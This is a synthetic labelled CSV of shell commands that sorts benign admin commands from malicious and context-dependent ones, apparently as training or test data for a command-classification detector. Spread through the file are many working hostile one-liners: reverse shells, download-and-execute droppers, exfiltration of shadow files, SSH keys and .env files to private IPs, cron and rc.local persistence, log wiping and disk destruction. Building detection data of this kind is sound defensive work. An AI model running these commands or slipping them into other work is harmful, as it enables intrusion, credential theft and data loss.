command,label,original_label,mitre_id
ls -la /home/admin,Benign,Synthetic,Synthetic
ssh admin@staging,Benign,Synthetic,Synthetic
"python -c 'import os,pty,socket;s=socket.socket();s.connect((""10.0.0.1"",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(""/bin/bash"")'",Malicious,Synthetic,Synthetic
curl -s http://10.100.200.1/rev.py -o /tmp/.hidden/.rev.py && bash /tmp/.hidden/.rev.py,Malicious,Synthetic,Synthetic
mv /var/www/index.html.old /var/www/index.html,Benign,Synthetic,Synthetic
chown -R root:root /var/www,Benign,Synthetic,Synthetic
conda env list,Benign,Synthetic,Synthetic
cp /opt/app/Dockerfile /opt/app/Dockerfile.bak,Benign,Synthetic,Synthetic
cat /etc/security/limits.conf,Benign,Synthetic,Synthetic
sudo cat /var/log/auth.log,Benign,Synthetic,Synthetic
ls -lt /var/lib | head -10,Benign,Synthetic,Synthetic
pgrep -la redis,Benign,Synthetic,Synthetic
cmake --build .,Benign,Synthetic,Synthetic
systemctl is-active memcached,Benign,Synthetic,Synthetic
w,Benign,Synthetic,Synthetic
nano /var/www/html/backup.sh,Benign,Synthetic,Synthetic
"perl -e 'use Socket;$i=""172.16.0.1"";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"")'",Malicious,Synthetic,Synthetic
make clean,Benign,Synthetic,Synthetic
nc -lvnp 8443,Context_Dependent,Synthetic,Synthetic
fc -l -10,Benign,Synthetic,Synthetic
cp /tmp/README.md /tmp/README.md.bak,Benign,Synthetic,Synthetic
ssh -L 6379:localhost:6379 user@jump,Context_Dependent,Synthetic,Synthetic
vim /home/deploy/healthcheck.sh,Benign,Synthetic,Synthetic
watch -n 2 'df -h',Benign,Synthetic,Synthetic
cat /root/.ssh/id_rsa | nc 10.0.0.5 9090,Malicious,Synthetic,Synthetic
cat /proc/1234/fd,Benign,Synthetic,Synthetic
ls -lah /opt/services,Benign,Synthetic,Synthetic
nm /usr/lib/libc.so | head,Benign,Synthetic,Synthetic
ssh deploy@staging,Benign,Synthetic,Synthetic
openssl s_client -connect example.com:443 </dev/null,Benign,Synthetic,Synthetic
ip link,Benign,Synthetic,Synthetic
cat ~/.ssh/config,Benign,Synthetic,Synthetic
pip install react,Benign,Synthetic,Synthetic
tail -f /var/log/syslog,Benign,Synthetic,Synthetic
cp /opt/services/app.py /opt/services/app.py.bak,Benign,Synthetic,Synthetic
chown -R www-data:www-data /home/user,Benign,Synthetic,Synthetic
echo '* * * * * /tmp/check.sh' | crontab -,Context_Dependent,Synthetic,Synthetic
apt install -y curl wget,Benign,Synthetic,Synthetic
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f,Malicious,Synthetic,Synthetic
chmod 700 ~/.ssh,Benign,Synthetic,Synthetic
nc -zv 192.168.0.10 80,Context_Dependent,Synthetic,Synthetic
npm install,Benign,Synthetic,Synthetic
git add -p,Benign,Synthetic,Synthetic
du -ah /home/deploy | sort -rh | head -10,Benign,Synthetic,Synthetic
df -i,Benign,Synthetic,Synthetic
printenv,Benign,Synthetic,Synthetic
journalctl -u nomad --since '1 hour ago',Benign,Synthetic,Synthetic
systemctl enable /tmp/malicious.service,Malicious,Synthetic,Synthetic
cat /proc/uptime,Benign,Synthetic,Synthetic
cal 2026,Benign,Synthetic,Synthetic
mount | grep ext4,Benign,Synthetic,Synthetic
head -50 /etc/nginx/nginx.conf,Benign,Synthetic,Synthetic
cat /etc/profile,Benign,Synthetic,Synthetic
gem install rails,Benign,Synthetic,Synthetic
curl -X POST -d @/home/user/.ssh/id_rsa http://192.168.0.10:5555/exfil,Malicious,Synthetic,Synthetic
grep -i 'ERROR' /var/log/nginx/error.log,Benign,Synthetic,Synthetic
exit 0,Benign,Synthetic,Synthetic
systemctl is-active grafana-server,Benign,Synthetic,Synthetic
ss -o state established,Benign,Synthetic,Synthetic
npm audit,Benign,Synthetic,Synthetic
netstat -i,Benign,Synthetic,Synthetic
df -h /var/lib,Benign,Synthetic,Synthetic
killall -HUP nginx,Benign,Synthetic,Synthetic
atq,Benign,Synthetic,Synthetic
ls /opt/services/,Benign,Synthetic,Synthetic
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.5 9001 >/tmp/f,Malicious,Synthetic,Synthetic
lsof -p 1234,Benign,Synthetic,Synthetic
lastlog,Benign,Synthetic,Synthetic
file /usr/bin/python3,Benign,Synthetic,Synthetic
nproc,Benign,Synthetic,Synthetic
curl -X POST -d @/etc/sudoers http://172.16.5.10:1234/exfil,Malicious,Synthetic,Synthetic
traceroute internal-dns,Benign,Synthetic,Synthetic
systemctl restart grafana-server,Benign,Synthetic,Synthetic
systemctl restart httpd,Benign,Synthetic,Synthetic
bc -l <<< '2^10',Benign,Synthetic,Synthetic
vim /srv/www/requirements.txt,Benign,Synthetic,Synthetic
ssh -D 5432 user@server,Context_Dependent,Synthetic,Synthetic
touch -t 202001010000 /tmp/backdoor,Malicious,Synthetic,Synthetic
pgrep -la java,Benign,Synthetic,Synthetic
ls -la /var/lib,Benign,Synthetic,Synthetic
pgrep -la gunicorn,Benign,Synthetic,Synthetic
docker inspect --format '{{.State.Status}}' web,Benign,Synthetic,Synthetic
docker exec app ls /app,Benign,Synthetic,Synthetic
vim /opt/app/backup.sh,Benign,Synthetic,Synthetic
ssh admin@production 'uptime',Benign,Synthetic,Synthetic
"nmap -p 22,80,443 192.168.1.100",Context_Dependent,Synthetic,Synthetic
ls -lt /home/admin | head -10,Benign,Synthetic,Synthetic
dig 8.8.8.8,Benign,Synthetic,Synthetic
docker build -t myapp:latest .,Benign,Synthetic,Synthetic
docker run -v /:/host --privileged -it alpine chroot /host /bin/bash,Malicious,Synthetic,Synthetic
journalctl -u logstash --since '1 hour ago',Benign,Synthetic,Synthetic
tshark -i eth0 -f 'port 443',Context_Dependent,Synthetic,Synthetic
ifconfig eth0,Benign,Synthetic,Synthetic
chmod 4755 /bin/dash,Malicious,Synthetic,Synthetic
find / -perm -2000 -type f 2>/dev/null,Context_Dependent,Synthetic,Synthetic
chmod 700 Makefile,Benign,Synthetic,Synthetic
apt-get upgrade -y,Benign,Synthetic,Synthetic
ufw status verbose,Benign,Synthetic,Synthetic
df -h /home/deploy,Benign,Synthetic,Synthetic
uname,Benign,Synthetic,Synthetic
grep -r 'BEGIN RSA' /home/,Context_Dependent,Synthetic,Synthetic
sha256sum important_file.tar.gz,Benign,Synthetic,Synthetic
find / -name '.env' -exec cat {} \; 2>/dev/null,Malicious,Synthetic,Synthetic
conda install numpy,Benign,Synthetic,Synthetic
docker exec proxy ls /app,Benign,Synthetic,Synthetic
pidof redis,Benign,Synthetic,Synthetic
find / -name '*.key' 2>/dev/null,Context_Dependent,Synthetic,Synthetic
cp /home/user/main.go /home/user/main.go.bak,Benign,Synthetic,Synthetic
nc -lvnp 4444,Context_Dependent,Synthetic,Synthetic
tee -a output.log,Benign,Synthetic,Synthetic
du -sh /home/admin,Benign,Synthetic,Synthetic
curl -I https://google.com,Benign,Synthetic,Synthetic
getconf LONG_BIT,Benign,Synthetic,Synthetic
cargo run --release,Benign,Synthetic,Synthetic
chown nginx:nginx /srv/www,Benign,Synthetic,Synthetic
ls -lah /srv/www,Benign,Synthetic,Synthetic
screen -dmS hidden /tmp/script.sh,Context_Dependent,Synthetic,Synthetic
systemctl status nomad,Benign,Synthetic,Synthetic
ls -lah /home/deploy,Benign,Synthetic,Synthetic
curl http://10.0.0.1:8080/shell.py | python3,Malicious,Synthetic,Synthetic
git fetch --all,Benign,Synthetic,Synthetic
journalctl -u rabbitmq-server --since '1 hour ago',Benign,Synthetic,Synthetic
vim /opt/services/app.py,Benign,Synthetic,Synthetic
mv /opt/services/Makefile.old /opt/services/Makefile,Benign,Synthetic,Synthetic
ln -sf /tmp/backdoor /etc/cron.d/update,Malicious,Synthetic,Synthetic
systemctl restart cron,Benign,Synthetic,Synthetic
dd if=/dev/sda of=/tmp/disk.img bs=4M,Context_Dependent,Synthetic,Synthetic
cat /proc/cpuinfo,Benign,Synthetic,Synthetic
apt install -y nginx,Benign,Synthetic,Synthetic
journalctl -u kibana --no-pager -n 20,Benign,Synthetic,Synthetic
kill -HUP $(pidof nginx),Benign,Synthetic,Synthetic
ltrace ls,Benign,Synthetic,Synthetic
wget http://172.16.5.10:443/agent -O /dev/shm/.proc/agent && chmod +x /dev/shm/.proc/agent && /dev/shm/.proc/agent,Malicious,Synthetic,Synthetic
echo 'command' | base64,Context_Dependent,Synthetic,Synthetic
du -ah /opt/services | sort -rh | head -10,Benign,Synthetic,Synthetic
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash,Malicious,Synthetic,Synthetic
cp /run/shm/backdoor /usr/local/bin/.update && chmod +x /usr/local/bin/.update,Malicious,Synthetic,Synthetic
pgrep -la mysql,Benign,Synthetic,Synthetic
vim /opt/services/deploy.sh,Benign,Synthetic,Synthetic
"python3 -c ""import urllib.request; exec(urllib.request.urlopen('http://10.0.0.1/payload.py').read())""",Malicious,Synthetic,Synthetic
git push origin main,Benign,Synthetic,Synthetic
tshark -i eth0,Context_Dependent,Synthetic,Synthetic
systemctl status prometheus,Benign,Synthetic,Synthetic
ssh admin@web-01,Benign,Synthetic,Synthetic
curl -X POST -d @/etc/sudoers http://192.168.56.1:4443/exfil,Malicious,Synthetic,Synthetic
docker rmi old-image:v1,Benign,Synthetic,Synthetic
python3 manage.py collectstatic --noinput,Benign,Synthetic,Synthetic
nano /opt/app/backup.sh,Benign,Synthetic,Synthetic
cargo test,Benign,Synthetic,Synthetic
bridge link,Benign,Synthetic,Synthetic
pgrep -la postgres,Benign,Synthetic,Synthetic
nmap -sV 172.16.5.10,Context_Dependent,Synthetic,Synthetic
ssh deploy@staging 'uptime',Benign,Synthetic,Synthetic
yes | head -5,Benign,Synthetic,Synthetic
tmux ls,Benign,Synthetic,Synthetic
docker restart worker,Benign,Synthetic,Synthetic
ssh -R 8080:localhost:80 user@server,Context_Dependent,Synthetic,Synthetic
systemctl status mysql,Benign,Synthetic,Synthetic
service nginx status,Benign,Synthetic,Synthetic
cp /var/www/Dockerfile /var/www/Dockerfile.bak,Benign,Synthetic,Synthetic
docker logs db,Benign,Synthetic,Synthetic
at -f /tmp/task.sh now + 1 minute,Context_Dependent,Synthetic,Synthetic
rsync -avz --delete src/ dest/,Benign,Synthetic,Synthetic
masscan -p1-1000 192.168.1.0/24,Context_Dependent,Synthetic,Synthetic
(crontab -l; echo '*/5 * * * * curl http://172.16.0.1/9090/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
docker pull python:3.11-slim,Benign,Synthetic,Synthetic
dpkg -l | grep nginx,Benign,Synthetic,Synthetic
docker inspect app,Benign,Synthetic,Synthetic
systemctl is-active vault,Benign,Synthetic,Synthetic
systemctl status kibana,Benign,Synthetic,Synthetic
systemctl enable nginx,Benign,Synthetic,Synthetic
lastlog -u $USER,Benign,Synthetic,Synthetic
rm -rf / --no-preserve-root,Malicious,Synthetic,Synthetic
curl http://172.16.0.50:8080/dropper | bash,Malicious,Synthetic,Synthetic
echo -n 'test' | xxd,Context_Dependent,Synthetic,Synthetic
journalctl -u cron --no-pager -n 20,Benign,Synthetic,Synthetic
rsync -avz -e ssh /data/ user@backup:/data/,Benign,Synthetic,Synthetic
cat /proc/version && uname -a && cat /etc/os-release,Malicious,Synthetic,Synthetic
vim /home/user/projects/server.js,Benign,Synthetic,Synthetic
journalctl -u sshd --since today,Benign,Synthetic,Synthetic
"nmap -p 22,80,443 192.168.0.10",Context_Dependent,Synthetic,Synthetic
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.16.0.50 7777 >/tmp/f,Malicious,Synthetic,Synthetic
sudo ufw enable,Benign,Synthetic,Synthetic
snap install lxd,Benign,Synthetic,Synthetic
chmod 600 ~/.ssh/id_rsa,Benign,Synthetic,Synthetic
mvn test,Benign,Synthetic,Synthetic
curl -X POST -d @/etc/ssh/sshd_config http://10.100.200.1:9001/exfil,Malicious,Synthetic,Synthetic
docker logs worker,Benign,Synthetic,Synthetic
pip install --upgrade requests,Benign,Synthetic,Synthetic
systemctl reload nginx,Benign,Synthetic,Synthetic
grep -v '^#' /etc/redis/redis.conf,Benign,Synthetic,Synthetic
curl http://192.168.1.50:80/shell.sh | bash,Malicious,Synthetic,Synthetic
df -h,Benign,Synthetic,Synthetic
journalctl -u apache2 --since '1 hour ago',Benign,Synthetic,Synthetic
vim /home/user/main.go,Benign,Synthetic,Synthetic
nmap -sV 10.0.0.0/24,Context_Dependent,Synthetic,Synthetic
cat /etc/fstab,Benign,Synthetic,Synthetic
pip install express,Benign,Synthetic,Synthetic
ls -lah /opt/app,Benign,Synthetic,Synthetic
curl -X POST -d @/etc/shadow http://10.0.0.1:9090/exfil,Malicious,Synthetic,Synthetic
grep -c 'Exception' /var/log/syslog,Benign,Synthetic,Synthetic
grep -r password /var/www/html/,Malicious,Synthetic,Synthetic
curl http://172.16.0.1:8080/beacon.sh | bash,Malicious,Synthetic,Synthetic
watch -n 1 'cat /proc/net/tcp',Context_Dependent,Synthetic,Synthetic
curl http://10.100.200.1:80/rev.py | bash,Malicious,Synthetic,Synthetic
nano /opt/services/README.md,Benign,Synthetic,Synthetic
kill -0 1234,Benign,Synthetic,Synthetic
chown -R nginx:nginx /home/admin,Benign,Synthetic,Synthetic
docker logs --tail 200 api,Benign,Synthetic,Synthetic
df -h /etc/nginx,Benign,Synthetic,Synthetic
hexdump -C /dev/urandom | head -5,Benign,Synthetic,Synthetic
ncdu /var/log,Benign,Synthetic,Synthetic
python3 setup.py install,Benign,Synthetic,Synthetic
strings /dev/mem | grep -i password,Context_Dependent,Synthetic,Synthetic
inotifywait -m /etc/ -e modify,Context_Dependent,Synthetic,Synthetic
openssl enc -d -aes-256-cbc -in file.enc -out file.txt,Context_Dependent,Synthetic,Synthetic
wbadmin delete systemstatebackup -keepVersions:0,Malicious,Synthetic,Synthetic
echo 'hello world',Benign,Synthetic,Synthetic
nc -e /bin/bash 172.16.5.10 8080,Malicious,Synthetic,Synthetic
xxd /root/.ssh/id_rsa | nc 10.0.0.1 5555,Malicious,Synthetic,Synthetic
for i in $(seq 1 254); do ssh -o ConnectTimeout=1 root@10.0.0.$i 'id' 2>/dev/null; done,Malicious,Synthetic,Synthetic
pip install lodash,Benign,Synthetic,Synthetic
vim /var/www/html/backup.sh,Benign,Synthetic,Synthetic
nano /tmp/README.md,Benign,Synthetic,Synthetic
systemctl is-active postgresql,Benign,Synthetic,Synthetic
git commit -m 'fix: update config',Benign,Synthetic,Synthetic
ssh -R 6379:localhost:6379 user@external,Context_Dependent,Synthetic,Synthetic
docker inspect db,Benign,Synthetic,Synthetic
mv /opt/services/server.js.old /opt/services/server.js,Benign,Synthetic,Synthetic
id -g,Benign,Synthetic,Synthetic
systemctl restart rabbitmq-server,Benign,Synthetic,Synthetic
strace -p 1234 -e trace=network,Benign,Synthetic,Synthetic
ls -la /opt/app,Benign,Synthetic,Synthetic
nc -e /bin/bash 172.16.5.10 31337,Malicious,Synthetic,Synthetic
[[ -d /var/log ]] && echo 'dir exists',Benign,Synthetic,Synthetic
cat ~/.gitconfig,Benign,Synthetic,Synthetic
ls -la /home/,Context_Dependent,Synthetic,Synthetic
ifconfig -a,Benign,Synthetic,Synthetic
pip install --upgrade typescript,Benign,Synthetic,Synthetic
vssadmin delete shadows /all /quiet,Malicious,Synthetic,Synthetic
mv /opt/services/README.md.old /opt/services/README.md,Benign,Synthetic,Synthetic
rsync -avz /home/user/.ssh/ attacker@10.0.0.1:/loot/,Malicious,Synthetic,Synthetic
ls -lah /etc/nginx,Benign,Synthetic,Synthetic
docker ps --format '{{.Names}}',Benign,Synthetic,Synthetic
ps aux | grep nginx,Benign,Synthetic,Synthetic
ls -lt /var/log | head -10,Benign,Synthetic,Synthetic
ls -la /usr/local/bin,Benign,Synthetic,Synthetic
"socat TCP-LISTEN:31337,fork -",Context_Dependent,Synthetic,Synthetic
grep -v '^#' /etc/nginx/nginx.conf,Benign,Synthetic,Synthetic
pip install --upgrade uvicorn,Benign,Synthetic,Synthetic
tail -f /var/log/nginx/error.log,Benign,Synthetic,Synthetic
cat /proc/self/environ | tr '\0' '\n' | grep -i password,Malicious,Synthetic,Synthetic
nc -zv 192.168.0.10 1-1000,Context_Dependent,Synthetic,Synthetic
kubectl rollout restart deployment/web,Benign,Synthetic,Synthetic
cp /tmp/backdoor /usr/local/bin/.update && chmod +x /usr/local/bin/.update,Malicious,Synthetic,Synthetic
grep -ri 'api_key' /home/,Context_Dependent,Synthetic,Synthetic
mv /home/deploy/deploy.sh.old /home/deploy/deploy.sh,Benign,Synthetic,Synthetic
cat /etc/sudoers,Context_Dependent,Synthetic,Synthetic
docker system df,Benign,Synthetic,Synthetic
sha256sum image.iso,Benign,Synthetic,Synthetic
gpasswd -a user docker,Benign,Synthetic,Synthetic
cat /etc/debian_version,Benign,Synthetic,Synthetic
snap list,Benign,Synthetic,Synthetic
tail -50 /var/log/auth.log,Benign,Synthetic,Synthetic
nslookup 8.8.8.8,Benign,Synthetic,Synthetic
zip -r backup.zip /var/www/html,Benign,Synthetic,Synthetic
chmod 644 healthcheck.sh,Benign,Synthetic,Synthetic
kill -HUP $(pidof node),Benign,Synthetic,Synthetic
"python3 -c 'import os; os.setuid(0); os.system(""/bin/bash"")'",Malicious,Synthetic,Synthetic
wget http://172.16.0.50:8443/implant -O /tmp/.hidden/implant && chmod +x /tmp/.hidden/implant && /tmp/.hidden/implant,Malicious,Synthetic,Synthetic
kill -HUP $(pidof redis),Benign,Synthetic,Synthetic
vim /home/user/projects/README.md,Benign,Synthetic,Synthetic
nano /home/deploy/requirements.txt,Benign,Synthetic,Synthetic
base64 /opt/app/.env | curl -d @- http://192.168.56.1:6666/,Malicious,Synthetic,Synthetic
ncat -lvnp 1234,Context_Dependent,Synthetic,Synthetic
pip install --upgrade react,Benign,Synthetic,Synthetic
vim /var/lib/main.go,Benign,Synthetic,Synthetic
chown www-data:www-data /var/www/html,Benign,Synthetic,Synthetic
pidof gunicorn,Benign,Synthetic,Synthetic
echo $JAVA_HOME,Benign,Synthetic,Synthetic
cron -f,Benign,Synthetic,Synthetic
docker exec web ls /app,Benign,Synthetic,Synthetic
resolvectl status,Benign,Synthetic,Synthetic
ufw status,Benign,Synthetic,Synthetic
update-rc.d nginx defaults,Benign,Synthetic,Synthetic
useradd -m -s /bin/bash newuser,Benign,Synthetic,Synthetic
php -S 0.0.0.0:8080,Context_Dependent,Synthetic,Synthetic
nmap -sV 192.168.1.100,Context_Dependent,Synthetic,Synthetic
renice -n 5 -p 1234,Benign,Synthetic,Synthetic
nmap -sV 172.16.0.0/24,Context_Dependent,Synthetic,Synthetic
git remote -v,Benign,Synthetic,Synthetic
pip show pandas,Benign,Synthetic,Synthetic
gcc -Wall -O2 -o app app.c,Benign,Synthetic,Synthetic
ip6tables -L -n,Benign,Synthetic,Synthetic
scp /etc/shadow attacker@10.0.0.1:/tmp/,Malicious,Synthetic,Synthetic
ssh -L 5432:localhost:5432 user@jump,Context_Dependent,Synthetic,Synthetic
echo $PATH,Benign,Synthetic,Synthetic
make -j$(nproc),Benign,Synthetic,Synthetic
groups,Benign,Synthetic,Synthetic
sleep 5,Benign,Synthetic,Synthetic
mv /home/deploy/index.html.old /home/deploy/index.html,Benign,Synthetic,Synthetic
ncat -lvnp 8443,Context_Dependent,Synthetic,Synthetic
nc -lvnp 5555,Context_Dependent,Synthetic,Synthetic
whoami,Benign,Synthetic,Synthetic
hdparm -I /dev/sda,Benign,Synthetic,Synthetic
brctl show,Benign,Synthetic,Synthetic
docker volume inspect data,Benign,Synthetic,Synthetic
python3 setup.py test,Benign,Synthetic,Synthetic
tune2fs -l /dev/sda1,Benign,Synthetic,Synthetic
cat /etc/mysql/my.cnf,Benign,Synthetic,Synthetic
ls -la /home/*/.ssh/ 2>/dev/null,Malicious,Synthetic,Synthetic
rpm -qi openssh-server,Benign,Synthetic,Synthetic
dpkg -L nginx,Benign,Synthetic,Synthetic
ls -la /etc/cron.d/,Benign,Synthetic,Synthetic
systemd-resolve --status,Benign,Synthetic,Synthetic
cd /tmp && curl -O http://10.0.0.1/elf && chmod 755 elf && ./elf,Malicious,Synthetic,Synthetic
kill -HUP $(pidof python),Benign,Synthetic,Synthetic
dirname /path/to/file.txt,Benign,Synthetic,Synthetic
cat /var/www/html/wp-config.php,Malicious,Synthetic,Synthetic
mv /srv/www/settings.json.old /srv/www/settings.json,Benign,Synthetic,Synthetic
nc -lvnp 8080,Context_Dependent,Synthetic,Synthetic
"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.0.10:9001",Malicious,Synthetic,Synthetic
brew install wget,Benign,Synthetic,Synthetic
docker exec -it cache bash,Benign,Synthetic,Synthetic
lsof -u www-data,Benign,Synthetic,Synthetic
cat /var/lib/mysql/data/*.frm | gzip | nc 10.0.0.1 6666,Malicious,Synthetic,Synthetic
cat /etc/crontab,Benign,Synthetic,Synthetic
ncat -lvnp 4443,Context_Dependent,Synthetic,Synthetic
find / -name 'wp-config.php' -exec cat {} \; 2>/dev/null,Malicious,Synthetic,Synthetic
lsblk -f,Benign,Synthetic,Synthetic
traceroute google.com,Benign,Synthetic,Synthetic
tc class show dev eth0,Benign,Synthetic,Synthetic
vim /opt/services/Makefile,Benign,Synthetic,Synthetic
journalctl -u haproxy --since '1 hour ago',Benign,Synthetic,Synthetic
wget --spider https://example.com,Benign,Synthetic,Synthetic
pkill -USR1 nginx,Benign,Synthetic,Synthetic
mv /srv/www/nginx.conf.old /srv/www/nginx.conf,Benign,Synthetic,Synthetic
xz database.sql,Benign,Synthetic,Synthetic
ping -c 4 8.8.8.8,Benign,Synthetic,Synthetic
git log --oneline -10,Benign,Synthetic,Synthetic
ssh admin@db-01 'uptime',Benign,Synthetic,Synthetic
mv /home/user/projects/config.yaml.old /home/user/projects/config.yaml,Benign,Synthetic,Synthetic
nano /srv/www/nginx.conf,Benign,Synthetic,Synthetic
cp /home/deploy/index.html /home/deploy/index.html.bak,Benign,Synthetic,Synthetic
updatedb,Benign,Synthetic,Synthetic
chown www-data:www-data /home/user,Benign,Synthetic,Synthetic
sudo -u root /bin/bash,Malicious,Synthetic,Synthetic
grep -i 'refused' /var/log/nginx/error.log,Benign,Synthetic,Synthetic
export HISTSIZE=0,Malicious,Synthetic,Synthetic
screen -S session1,Benign,Synthetic,Synthetic
grep -i 'Exception' /var/log/nginx/error.log,Benign,Synthetic,Synthetic
tracepath google.com,Benign,Synthetic,Synthetic
netstat -s,Benign,Synthetic,Synthetic
sudo iptables -L -n,Benign,Synthetic,Synthetic
setfacl -m u:deploy:rwx /opt/app,Benign,Synthetic,Synthetic
netdiscover -r 192.168.1.0/24,Context_Dependent,Synthetic,Synthetic
cal -3,Benign,Synthetic,Synthetic
shred -vfz -n 5 /dev/sda,Malicious,Synthetic,Synthetic
echo '#!/bin/bash\ncurl http://10.0.0.1/shell|bash' > /etc/cron.daily/update,Malicious,Synthetic,Synthetic
systemctl restart postgresql,Benign,Synthetic,Synthetic
brew list,Benign,Synthetic,Synthetic
parallel echo ::: a b c,Benign,Synthetic,Synthetic
git switch -c feature/auth,Benign,Synthetic,Synthetic
ls -la /var/log/,Benign,Synthetic,Synthetic
find / -perm -4000 -type f 2>/dev/null,Benign,Synthetic,Synthetic
mv /opt/app/backup.sh.old /opt/app/backup.sh,Benign,Synthetic,Synthetic
echo '' > /var/log/lastlog,Malicious,Synthetic,Synthetic
vim /var/lib/docker-compose.yml,Benign,Synthetic,Synthetic
npm run build,Benign,Synthetic,Synthetic
"socat TCP-LISTEN:8080,fork -",Context_Dependent,Synthetic,Synthetic
git diff,Benign,Synthetic,Synthetic
cp /home/deploy/healthcheck.sh /home/deploy/healthcheck.sh.bak,Benign,Synthetic,Synthetic
cat /proc/1234/cmdline,Benign,Synthetic,Synthetic
false,Benign,Synthetic,Synthetic
git checkout -b new-feature,Benign,Synthetic,Synthetic
nc -lvnp 31337,Context_Dependent,Synthetic,Synthetic
make test,Benign,Synthetic,Synthetic
cat /dev/null > ~/.bash_history && history -c,Malicious,Synthetic,Synthetic
grep -c 'traceback' /var/log/syslog,Benign,Synthetic,Synthetic
sudo -l,Benign,Synthetic,Synthetic
cp /opt/app/app.py /opt/app/app.py.bak,Benign,Synthetic,Synthetic
zip -r /tmp/loot.zip /home/ && curl -F 'f=@/tmp/loot.zip' http://10.0.0.1/,Malicious,Synthetic,Synthetic
echo '/dev/shm/.proc/.implant &' >> /etc/rc.local,Malicious,Synthetic,Synthetic
base64 /etc/sudoers | curl -d @- http://10.10.14.3:1337/,Malicious,Synthetic,Synthetic
docker restart app,Benign,Synthetic,Synthetic
ls /var/www/,Benign,Synthetic,Synthetic
ruby -run -e httpd . -p 8080,Context_Dependent,Synthetic,Synthetic
cat /etc/hosts | grep -v '^#',Malicious,Synthetic,Synthetic
nslookup api.company.com,Benign,Synthetic,Synthetic
dig lb-01,Benign,Synthetic,Synthetic
du -ah /var/www | sort -rh | head -10,Benign,Synthetic,Synthetic
fail2ban-client status sshd,Benign,Synthetic,Synthetic
uvicorn main:app --reload,Benign,Synthetic,Synthetic
wmiexec.py admin:password@10.0.0.2,Malicious,Synthetic,Synthetic
conda list,Benign,Synthetic,Synthetic
tmux attach -t work,Benign,Synthetic,Synthetic
grep -i fail /var/log/auth.log,Benign,Synthetic,Synthetic
arch,Benign,Synthetic,Synthetic
cp /var/www/html/settings.json /var/www/html/settings.json.bak,Benign,Synthetic,Synthetic
cp /opt/services/Makefile /opt/services/Makefile.bak,Benign,Synthetic,Synthetic
vim /home/user/nginx.conf,Benign,Synthetic,Synthetic
python3 -m unittest discover,Benign,Synthetic,Synthetic
pip install --upgrade redis,Benign,Synthetic,Synthetic
timestomp /tmp/backdoor -m '2020-01-01 00:00:00',Malicious,Synthetic,Synthetic
echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && systemctl restart sshd,Malicious,Synthetic,Synthetic
python3 manage.py runserver,Benign,Synthetic,Synthetic
cat /etc/anacrontab,Benign,Synthetic,Synthetic
git fetch origin,Benign,Synthetic,Synthetic
mv /opt/services/deploy.sh.old /opt/services/deploy.sh,Benign,Synthetic,Synthetic
uptime,Benign,Synthetic,Synthetic
wget http://172.16.0.50:80/implant -O /dev/shm/implant && chmod +x /dev/shm/implant && /dev/shm/implant,Malicious,Synthetic,Synthetic
ssh-keygen -t ed25519 -C 'user@host',Benign,Synthetic,Synthetic
ssh deploy@db-01 'uptime',Benign,Synthetic,Synthetic
find /var/log -name '*.gz' -mtime +90,Benign,Synthetic,Synthetic
ls -lt /home/user/projects | head -10,Benign,Synthetic,Synthetic
ssh user@server 'df -h',Benign,Synthetic,Synthetic
grep -v '^#' /etc/postgresql/14/main/pg_hba.conf,Benign,Synthetic,Synthetic
pip install -r requirements.txt,Benign,Synthetic,Synthetic
mv /tmp/Makefile.old /tmp/Makefile,Benign,Synthetic,Synthetic
find / -name authorized_keys 2>/dev/null,Context_Dependent,Synthetic,Synthetic
ls -lt /opt/app | head -10,Benign,Synthetic,Synthetic
nc -zv 192.168.1.50 1-1000,Context_Dependent,Synthetic,Synthetic
env,Benign,Synthetic,Synthetic
cat ~/.ssh/authorized_keys,Context_Dependent,Synthetic,Synthetic
cat /proc/self/status,Context_Dependent,Synthetic,Synthetic
du -sh /var/www/html,Benign,Synthetic,Synthetic
